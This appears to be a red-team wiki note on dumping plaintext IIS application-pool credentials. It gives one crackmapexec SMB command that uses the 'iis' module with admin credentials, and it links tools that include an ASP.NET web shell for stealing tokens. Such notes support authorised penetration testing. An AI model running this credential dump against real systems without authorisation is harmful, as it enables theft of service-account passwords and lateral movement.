---
title: IIS AppPool Dump
---

[[notes/mitre-attack/credential-access|Access Credentials]] of the IIS service account as [[notes/windows/credential-access-admin|local admin]].

Retrieve plain passwords of IIS application pools ([source](https://twitter.com/mpgn_x64/status/1693249217609740470)).

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb web01.corp.local -u jdoeadm -p 'passw0rd' -M iis
    ~~~

    If the module can not dump the password of an account it is probably a gMSA.

Untested tools:

- [Handly](https://github.com/blackarrowsec/Handly/tree/main/IIS), ASP.NET web shell that steals and impersonates tokens held by IIS
- [AppPoolCredDecrypt](https://github.com/xpn/RandomTSScripts/tree/master/apppoolcreddecrypt)
